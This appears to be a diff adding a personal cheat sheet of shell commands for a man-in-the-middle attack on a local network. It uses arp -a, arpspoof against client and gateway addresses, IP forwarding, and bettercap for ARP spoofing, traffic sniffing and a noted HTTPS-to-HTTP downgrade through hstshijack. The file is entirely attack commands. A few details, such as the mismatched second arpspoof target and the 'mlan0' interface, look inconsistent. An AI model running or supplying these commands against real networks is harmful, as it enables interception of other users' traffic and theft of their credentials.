@@ -1,0 +1,29 @@
+arp -a
+
+# arpspoof -i [interface] -t [clientIP] [GatewayIP]
+# arpspoof -i [interface] -t [GatewayIP] [clientIP]
+
+arpspoof -i wlan0 -t 192.168.1.21 192.168.1.1
+arpspoof -i wlan0 -t 192.168.1.10 192.168.1.21
+
+echo 1 > /proc/sys/net/ipv4/ip_forward
+
+# ========== bettercap =================
+bettercap -iface mlan0
+net.probe on
+net.show
+
+# ARP Spoofing
+set arp.spoof.fullduplex true
+set arp.spoof.targets 192.168.1.4
+arp.spoof on
+
+# set net.sniff.local true 
+net.sniff on
+
+# use hstshijack for https downgrade to http
+
+
+
+
+
